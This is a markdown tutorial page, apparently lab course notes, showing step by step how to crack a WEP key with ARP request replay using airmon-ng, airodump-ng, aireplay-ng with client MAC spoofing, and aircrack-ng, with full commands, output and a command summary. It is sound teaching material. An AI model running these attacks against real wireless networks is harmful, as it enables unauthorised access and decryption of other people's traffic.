---
title: ARP Request Replay Attack
description: ARP Request Replay Attack
date: '2026-09-21'
tags: []
published: true
slug: arp-request-replay-attack
category: wifi
folder: diving-into-wep-attacks
order: 10
---
# ARP Request Replay Attack

## What is it?

This is the classic, most reliable way to generate lots of **IVs** quickly for cracking a WEP key.

**The idea:** Capture a single valid ARP packet, then replay (resend) it to the router over and over. Each time the router responds, it uses a **new IV**. Do this enough times, and you'll gather thousands of IVs — enough to crack the WEP key using aircrack-ng.

---

## Step 1: Enable Monitor Mode

```shellsession
iccys@htb[/htb]$ sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

Confirm it worked:

```shellsession
iccys@htb[/htb]$ iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=30 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Power Management:off
```

---

## Step 2: Start Capturing Traffic

```shellsession
iccys@htb[/htb]$ airodump-ng wlan0mon -c 1 -w WEP

10:00:17  Created capture file "WEP-01.cap".

 CH  1 ][ Elapsed: 12 s ][ 2024-08-05 10:00

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:D1:AC:E1:21:D1  -47 100      149        7    0   1   11   WEP  WEP         HackTheWifi

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B2:D1:AC:E1:21:D1  4A:DD:C6:71:5A:3B  -29    1 - 5      0        6
```

This scans and saves everything to `WEP-01.cap`. **Leave this running in this terminal**.

💡 **Tip:** If there are multiple networks around, add `-b <BSSID>` to focus only on your target.

---

## Step 3: Launch the ARP Replay Attack (Second Terminal)

```shellsession
iccys@htb[/htb]$ sudo aireplay-ng -3 -b B2:D1:AC:E1:21:D1 -h 4A:DD:C6:71:5A:3B wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
        ifconfig wlan0mon hw ether 4A:DD:C6:71:5A:3B
10:01:29  Waiting for beacon frame (BSSID: B2:D1:AC:E1:21:D1) on channel 1
Saving ARP requests in replay_arp-0805-100129.cap
You should also start airodump-ng to capture replies.
Read 99 packets (got 0 ARP requests), sent 0 packets...
```

**What each part means:**

|Part|Meaning|
|---|---|
|`-3`|ARP request replay attack mode|
|`-b B2:D1:AC:E1:21:D1`|The target router's MAC address|
|`-h 4A:DD:C6:71:5A:3B`|The connected client's MAC address (aireplay-ng will pretend to be this device)|
|`wlan0mon`|Your monitor-mode interface|

📝 **Note:** The tool automatically adjusts your interface's MAC address to match `-h` — that's what the first warning line is about, it's expected behavior, not an error.

At first, it'll show **0 ARP requests captured** — that's normal, it's just waiting for one to show up naturally on the network.

---

## Step 4: Watch It Ramp Up

Once a valid ARP request is captured, it starts replaying automatically, and the numbers climb fast:

```shellsession
Read 195576 packets (got 35039 ARP requests and 0 ACKs), sent 34758 packets...(500 pps)
```

That's over 35,000 ARP requests captured, at a rate of 500 packets per second. Let this run until you have enough IVs (more on exact numbers below).

---

## Step 5: Crack the Key with Aircrack-ng

Once you've collected enough traffic, run aircrack-ng against the capture file:

```shellsession
iccys@htb[/htb]$ aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap

Reading packets, please wait...
Opening WEP-01.cap
Read 195576 packets.

1 potential targets
Got 97822 out of 95000 IVs
Starting PTW attack with 97822 IVs.
                     KEY FOUND! [ 33:44:55:22:11 ]
Attack Decrypted correctly: 100% captured IVs.
```

🎉 **Success!** The WEP key was recovered: `33:44:55:22:11`

You can now use this key to connect directly to the network, or decrypt captured traffic using airdecap-ng (covered in an earlier guide).

---

## How Many IVs Do You Actually Need?

Aircrack-ng uses the **PTW attack** by default — it's the faster, smarter method:

|Key Size|IVs Needed (PTW, default)|IVs Needed (Korek/FMS, `-K` flag)|
|---|---|---|
|64-bit|~20,000|~250,000|
|128-bit|~40,000+|~1,500,000|

**Bottom line:** Stick with the default PTW attack unless you have a specific reason not to — it needs far fewer captured IVs and finishes much faster.

---

## Command Summary

```bash
sudo airmon-ng start wlan0                                          # Enable monitor mode
iwconfig                                                             # Confirm monitor mode is active
airodump-ng wlan0mon -c 1 -w WEP                                    # Capture traffic and save to WEP-01.cap (Terminal 1)
sudo aireplay-ng -3 -b <BSSID> -h <client MAC> wlan0mon             # Launch the ARP replay attack (Terminal 2)
aircrack-ng -b <BSSID> WEP-01.cap                                   # Crack the WEP key from the capture file
```

**What each argument means:**

|Argument|Meaning|
|---|---|
|`start wlan0`|Enable monitor mode on `wlan0`|
|`-c 1`|Target channel 1|
|`-w WEP`|Save captured packets to files starting with "WEP"|
|`-3`|ARP request replay attack mode (aireplay-ng)|
|`-b <BSSID>`|Target router's MAC address|
|`-h <client MAC>`|The client MAC address to impersonate|
|`-K`|Use the older, slower Korek/FMS attack instead of PTW (aircrack-ng)|

---

## What's Next?

Next up: the **Fragmentation Attack**, another method for generating IVs, useful in situations where ARP replay doesn't work as well.
